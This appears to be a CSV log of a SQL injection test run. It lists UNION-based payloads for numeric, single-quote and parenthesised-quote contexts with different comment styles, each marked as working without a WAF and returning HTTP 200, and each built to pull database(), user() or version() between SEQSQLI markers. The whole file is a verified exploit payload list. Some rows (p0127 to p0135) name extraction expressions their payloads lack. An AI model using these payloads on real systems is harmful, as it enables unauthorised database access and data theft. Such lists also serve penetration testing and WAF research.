payload_id,payload,context,columns,comment_style,marker_column_left,marker_column_right,extraction_expr,valid_without_waf,status_code,response_len,notes
p0018,"-1 UNION SELECT 'SEQSQLI_START',version(),'SEQSQLI_END'--+",numeric,3,dashplus,1,3,version(),yes,200,857,
p0019,"-1 UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",numeric,3,dash,2,3,database(),yes,200,848,
p0020,"-1 UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",numeric,3,hash,2,3,database(),yes,200,845,
p0021,"-1 UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",numeric,3,dashplus,2,3,database(),yes,200,847,
p0022,"-1 UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",numeric,3,dash,2,3,user(),yes,200,848,
p0023,"-1 UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",numeric,3,hash,2,3,user(),yes,200,845,
p0024,"-1 UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",numeric,3,dashplus,2,3,user(),yes,200,847,
p0025,"-1 UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",numeric,3,dash,2,3,version(),yes,200,848,
p0026,"-1 UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",numeric,3,hash,2,3,version(),yes,200,845,
p0027,"-1 UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",numeric,3,dashplus,2,3,version(),yes,200,847,
p0028,"-1 UNION SELECT 'SEQSQLI_START',database(),3,'SEQSQLI_END'-- -",numeric,4,dash,1,4,database(),yes,200,861,
p0029,"-1 UNION SELECT 'SEQSQLI_START',database(),3,'SEQSQLI_END'#",numeric,4,hash,1,4,database(),yes,200,858,
p0030,"-1 UNION SELECT 'SEQSQLI_START',database(),3,'SEQSQLI_END'--+",numeric,4,dashplus,1,4,database(),yes,200,860,
p0031,"-1 UNION SELECT 'SEQSQLI_START',user(),3,'SEQSQLI_END'-- -",numeric,4,dash,1,4,user(),yes,200,857,
p0032,"-1 UNION SELECT 'SEQSQLI_START',user(),3,'SEQSQLI_END'#",numeric,4,hash,1,4,user(),yes,200,854,
p0033,"-1 UNION SELECT 'SEQSQLI_START',user(),3,'SEQSQLI_END'--+",numeric,4,dashplus,1,4,user(),yes,200,856,
p0034,"-1 UNION SELECT 'SEQSQLI_START',version(),3,'SEQSQLI_END'-- -",numeric,4,dash,1,4,version(),yes,200,860,
p0035,"-1 UNION SELECT 'SEQSQLI_START',version(),3,'SEQSQLI_END'#",numeric,4,hash,1,4,version(),yes,200,857,
p0036,"-1 UNION SELECT 'SEQSQLI_START',version(),3,'SEQSQLI_END'--+",numeric,4,dashplus,1,4,version(),yes,200,859,
p0037,"-1 UNION SELECT database(),'SEQSQLI_START',3,'SEQSQLI_END'-- -",numeric,4,dash,2,4,database(),yes,200,850,
p0038,"-1 UNION SELECT database(),'SEQSQLI_START',3,'SEQSQLI_END'#",numeric,4,hash,2,4,database(),yes,200,847,
p0039,"-1 UNION SELECT database(),'SEQSQLI_START',3,'SEQSQLI_END'--+",numeric,4,dashplus,2,4,database(),yes,200,849,
p0040,"-1 UNION SELECT user(),'SEQSQLI_START',3,'SEQSQLI_END'-- -",numeric,4,dash,2,4,user(),yes,200,850,
p0041,"-1 UNION SELECT user(),'SEQSQLI_START',3,'SEQSQLI_END'#",numeric,4,hash,2,4,user(),yes,200,847,
p0042,"-1 UNION SELECT user(),'SEQSQLI_START',3,'SEQSQLI_END'--+",numeric,4,dashplus,2,4,user(),yes,200,849,
p0043,"-1 UNION SELECT version(),'SEQSQLI_START',3,'SEQSQLI_END'-- -",numeric,4,dash,2,4,version(),yes,200,850,
p0044,"-1 UNION SELECT version(),'SEQSQLI_START',3,'SEQSQLI_END'#",numeric,4,hash,2,4,version(),yes,200,847,
p0045,"-1 UNION SELECT version(),'SEQSQLI_START',3,'SEQSQLI_END'--+",numeric,4,dashplus,2,4,version(),yes,200,849,
p0046,"-1 UNION SELECT 'SEQSQLI_START',database(),3,4,'SEQSQLI_END'-- -",numeric,5,dash,1,5,database(),yes,200,863,
p0047,"-1 UNION SELECT 'SEQSQLI_START',database(),3,4,'SEQSQLI_END'#",numeric,5,hash,1,5,database(),yes,200,860,
p0048,"-1 UNION SELECT 'SEQSQLI_START',database(),3,4,'SEQSQLI_END'--+",numeric,5,dashplus,1,5,database(),yes,200,862,
p0049,"-1 UNION SELECT 'SEQSQLI_START',user(),3,4,'SEQSQLI_END'-- -",numeric,5,dash,1,5,user(),yes,200,859,
p0050,"-1 UNION SELECT 'SEQSQLI_START',user(),3,4,'SEQSQLI_END'#",numeric,5,hash,1,5,user(),yes,200,856,
p0051,"-1 UNION SELECT 'SEQSQLI_START',user(),3,4,'SEQSQLI_END'--+",numeric,5,dashplus,1,5,user(),yes,200,858,
p0052,"-1 UNION SELECT 'SEQSQLI_START',version(),3,4,'SEQSQLI_END'-- -",numeric,5,dash,1,5,version(),yes,200,862,
p0053,"-1 UNION SELECT 'SEQSQLI_START',version(),3,4,'SEQSQLI_END'#",numeric,5,hash,1,5,version(),yes,200,859,
p0054,"-1 UNION SELECT 'SEQSQLI_START',version(),3,4,'SEQSQLI_END'--+",numeric,5,dashplus,1,5,version(),yes,200,861,
p0055,"-1 UNION SELECT database(),'SEQSQLI_START',3,4,'SEQSQLI_END'-- -",numeric,5,dash,2,5,database(),yes,200,852,
p0056,"-1 UNION SELECT database(),'SEQSQLI_START',3,4,'SEQSQLI_END'#",numeric,5,hash,2,5,database(),yes,200,849,
p0057,"-1 UNION SELECT database(),'SEQSQLI_START',3,4,'SEQSQLI_END'--+",numeric,5,dashplus,2,5,database(),yes,200,851,
p0058,"-1 UNION SELECT user(),'SEQSQLI_START',3,4,'SEQSQLI_END'-- -",numeric,5,dash,2,5,user(),yes,200,852,
p0059,"-1 UNION SELECT user(),'SEQSQLI_START',3,4,'SEQSQLI_END'#",numeric,5,hash,2,5,user(),yes,200,849,
p0060,"-1 UNION SELECT user(),'SEQSQLI_START',3,4,'SEQSQLI_END'--+",numeric,5,dashplus,2,5,user(),yes,200,851,
p0061,"-1 UNION SELECT version(),'SEQSQLI_START',3,4,'SEQSQLI_END'-- -",numeric,5,dash,2,5,version(),yes,200,852,
p0062,"-1 UNION SELECT version(),'SEQSQLI_START',3,4,'SEQSQLI_END'#",numeric,5,hash,2,5,version(),yes,200,849,
p0063,"-1 UNION SELECT version(),'SEQSQLI_START',3,4,'SEQSQLI_END'--+",numeric,5,dashplus,2,5,version(),yes,200,851,
p0082,"-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",single_quote,3,dash,2,3,database(),yes,200,726,
p0083,"-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",single_quote,3,hash,2,3,database(),yes,200,726,
p0084,"-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",single_quote,3,dashplus,2,3,database(),yes,200,726,
p0085,"-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",single_quote,3,dash,2,3,user(),yes,200,726,
p0086,"-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",single_quote,3,hash,2,3,user(),yes,200,726,
p0087,"-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",single_quote,3,dashplus,2,3,user(),yes,200,726,
p0088,"-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",single_quote,3,dash,2,3,version(),yes,200,726,
p0089,"-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",single_quote,3,hash,2,3,version(),yes,200,726,
p0090,"-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",single_quote,3,dashplus,2,3,version(),yes,200,726,
p0127,"-1') UNION SELECT 'SEQSQLI_START','SEQSQLI_END'-- -",paren_single,2,dash,1,2,database(),yes,200,864,
p0128,"-1') UNION SELECT 'SEQSQLI_START','SEQSQLI_END'#",paren_single,2,hash,1,2,database(),yes,200,861,
p0129,"-1') UNION SELECT 'SEQSQLI_START','SEQSQLI_END'--+",paren_single,2,dashplus,1,2,database(),yes,200,863,
p0130,"-1') UNION SELECT 'SEQSQLI_START','SEQSQLI_END'-- -",paren_single,2,dash,1,2,user(),yes,200,864,
p0131,"-1') UNION SELECT 'SEQSQLI_START','SEQSQLI_END'#",paren_single,2,hash,1,2,user(),yes,200,861,
p0132,"-1') UNION SELECT 'SEQSQLI_START','SEQSQLI_END'--+",paren_single,2,dashplus,1,2,user(),yes,200,863,
p0133,"-1') UNION SELECT 'SEQSQLI_START','SEQSQLI_END'-- -",paren_single,2,dash,1,2,version(),yes,200,864,
p0134,"-1') UNION SELECT 'SEQSQLI_START','SEQSQLI_END'#",paren_single,2,hash,1,2,version(),yes,200,861,
p0135,"-1') UNION SELECT 'SEQSQLI_START','SEQSQLI_END'--+",paren_single,2,dashplus,1,2,version(),yes,200,863,
p0136,"-1') UNION SELECT 'SEQSQLI_START',database(),'SEQSQLI_END'-- -",paren_single,3,dash,1,3,database(),yes,200,875,
p0137,"-1') UNION SELECT 'SEQSQLI_START',database(),'SEQSQLI_END'#",paren_single,3,hash,1,3,database(),yes,200,872,
p0138,"-1') UNION SELECT 'SEQSQLI_START',database(),'SEQSQLI_END'--+",paren_single,3,dashplus,1,3,database(),yes,200,874,
p0139,"-1') UNION SELECT 'SEQSQLI_START',user(),'SEQSQLI_END'-- -",paren_single,3,dash,1,3,user(),yes,200,871,
p0140,"-1') UNION SELECT 'SEQSQLI_START',user(),'SEQSQLI_END'#",paren_single,3,hash,1,3,user(),yes,200,868,
p0141,"-1') UNION SELECT 'SEQSQLI_START',user(),'SEQSQLI_END'--+",paren_single,3,dashplus,1,3,user(),yes,200,870,
p0142,"-1') UNION SELECT 'SEQSQLI_START',version(),'SEQSQLI_END'-- -",paren_single,3,dash,1,3,version(),yes,200,874,
p0143,"-1') UNION SELECT 'SEQSQLI_START',version(),'SEQSQLI_END'#",paren_single,3,hash,1,3,version(),yes,200,871,
p0144,"-1') UNION SELECT 'SEQSQLI_START',version(),'SEQSQLI_END'--+",paren_single,3,dashplus,1,3,version(),yes,200,873,
p0145,"-1') UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",paren_single,3,dash,2,3,database(),yes,200,875,
p0146,"-1') UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",paren_single,3,hash,2,3,database(),yes,200,872,
p0147,"-1') UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",paren_single,3,dashplus,2,3,database(),yes,200,874,
p0148,"-1') UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",paren_single,3,dash,2,3,user(),yes,200,871,
p0149,"-1') UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",paren_single,3,hash,2,3,user(),yes,200,868,
p0150,"-1') UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",paren_single,3,dashplus,2,3,user(),yes,200,870,
p0151,"-1') UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",paren_single,3,dash,2,3,version(),yes,200,874,
p0152,"-1') UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",paren_single,3,hash,2,3,version(),yes,200,871,
p0153,"-1') UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",paren_single,3,dashplus,2,3,version(),yes,200,873,
p0154,"-1') UNION SELECT 'SEQSQLI_START',database(),3,'SEQSQLI_END'-- -",paren_single,4,dash,1,4,database(),yes,200,877,
p0155,"-1') UNION SELECT 'SEQSQLI_START',database(),3,'SEQSQLI_END'#",paren_single,4,hash,1,4,database(),yes,200,874,
p0156,"-1') UNION SELECT 'SEQSQLI_START',database(),3,'SEQSQLI_END'--+",paren_single,4,dashplus,1,4,database(),yes,200,876,
p0157,"-1') UNION SELECT 'SEQSQLI_START',user(),3,'SEQSQLI_END'-- -",paren_single,4,dash,1,4,user(),yes,200,873,
p0158,"-1') UNION SELECT 'SEQSQLI_START',user(),3,'SEQSQLI_END'#",paren_single,4,hash,1,4,user(),yes,200,870,
p0159,"-1') UNION SELECT 'SEQSQLI_START',user(),3,'SEQSQLI_END'--+",paren_single,4,dashplus,1,4,user(),yes,200,872,
p0160,"-1') UNION SELECT 'SEQSQLI_START',version(),3,'SEQSQLI_END'-- -",paren_single,4,dash,1,4,version(),yes,200,876,
p0161,"-1') UNION SELECT 'SEQSQLI_START',version(),3,'SEQSQLI_END'#",paren_single,4,hash,1,4,version(),yes,200,873,
p0162,"-1') UNION SELECT 'SEQSQLI_START',version(),3,'SEQSQLI_END'--+",paren_single,4,dashplus,1,4,version(),yes,200,875,
p0163,"-1') UNION SELECT database(),'SEQSQLI_START',3,'SEQSQLI_END'-- -",paren_single,4,dash,2,4,database(),yes,200,877,
p0164,"-1') UNION SELECT database(),'SEQSQLI_START',3,'SEQSQLI_END'#",paren_single,4,hash,2,4,database(),yes,200,874,
p0165,"-1') UNION SELECT database(),'SEQSQLI_START',3,'SEQSQLI_END'--+",paren_single,4,dashplus,2,4,database(),yes,200,876,
p0166,"-1') UNION SELECT user(),'SEQSQLI_START',3,'SEQSQLI_END'-- -",paren_single,4,dash,2,4,user(),yes,200,873,
p0167,"-1') UNION SELECT user(),'SEQSQLI_START',3,'SEQSQLI_END'#",paren_single,4,hash,2,4,user(),yes,200,870,
p0168,"-1') UNION SELECT user(),'SEQSQLI_START',3,'SEQSQLI_END'--+",paren_single,4,dashplus,2,4,user(),yes,200,872,
p0169,"-1') UNION SELECT version(),'SEQSQLI_START',3,'SEQSQLI_END'-- -",paren_single,4,dash,2,4,version(),yes,200,876,
p0170,"-1') UNION SELECT version(),'SEQSQLI_START',3,'SEQSQLI_END'#",paren_single,4,hash,2,4,version(),yes,200,873,
p0171,"-1') UNION SELECT version(),'SEQSQLI_START',3,'SEQSQLI_END'--+",paren_single,4,dashplus,2,4,version(),yes,200,875,
p0172,"-1') UNION SELECT 'SEQSQLI_START',database(),3,4,'SEQSQLI_END'-- -",paren_single,5,dash,1,5,database(),yes,200,879,
p0173,"-1') UNION SELECT 'SEQSQLI_START',database(),3,4,'SEQSQLI_END'#",paren_single,5,hash,1,5,database(),yes,200,876,
p0174,"-1') UNION SELECT 'SEQSQLI_START',database(),3,4,'SEQSQLI_END'--+",paren_single,5,dashplus,1,5,database(),yes,200,878,
p0175,"-1') UNION SELECT 'SEQSQLI_START',user(),3,4,'SEQSQLI_END'-- -",paren_single,5,dash,1,5,user(),yes,200,875,
p0176,"-1') UNION SELECT 'SEQSQLI_START',user(),3,4,'SEQSQLI_END'#",paren_single,5,hash,1,5,user(),yes,200,872,
p0177,"-1') UNION SELECT 'SEQSQLI_START',user(),3,4,'SEQSQLI_END'--+",paren_single,5,dashplus,1,5,user(),yes,200,874,
p0178,"-1') UNION SELECT 'SEQSQLI_START',version(),3,4,'SEQSQLI_END'-- -",paren_single,5,dash,1,5,version(),yes,200,878,
p0179,"-1') UNION SELECT 'SEQSQLI_START',version(),3,4,'SEQSQLI_END'#",paren_single,5,hash,1,5,version(),yes,200,875,
p0180,"-1') UNION SELECT 'SEQSQLI_START',version(),3,4,'SEQSQLI_END'--+",paren_single,5,dashplus,1,5,version(),yes,200,877,
p0181,"-1') UNION SELECT database(),'SEQSQLI_START',3,4,'SEQSQLI_END'-- -",paren_single,5,dash,2,5,database(),yes,200,879,
p0182,"-1') UNION SELECT database(),'SEQSQLI_START',3,4,'SEQSQLI_END'#",paren_single,5,hash,2,5,database(),yes,200,876,
p0183,"-1') UNION SELECT database(),'SEQSQLI_START',3,4,'SEQSQLI_END'--+",paren_single,5,dashplus,2,5,database(),yes,200,878,
p0184,"-1') UNION SELECT user(),'SEQSQLI_START',3,4,'SEQSQLI_END'-- -",paren_single,5,dash,2,5,user(),yes,200,875,
p0185,"-1') UNION SELECT user(),'SEQSQLI_START',3,4,'SEQSQLI_END'#",paren_single,5,hash,2,5,user(),yes,200,872,
p0186,"-1') UNION SELECT user(),'SEQSQLI_START',3,4,'SEQSQLI_END'--+",paren_single,5,dashplus,2,5,user(),yes,200,874,
p0187,"-1') UNION SELECT version(),'SEQSQLI_START',3,4,'SEQSQLI_END'-- -",paren_single,5,dash,2,5,version(),yes,200,878,
p0188,"-1') UNION SELECT version(),'SEQSQLI_START',3,4,'SEQSQLI_END'#",paren_single,5,hash,2,5,version(),yes,200,875,
p0189,"-1') UNION SELECT version(),'SEQSQLI_START',3,4,'SEQSQLI_END'--+",paren_single,5,dashplus,2,5,version(),yes,200,877,
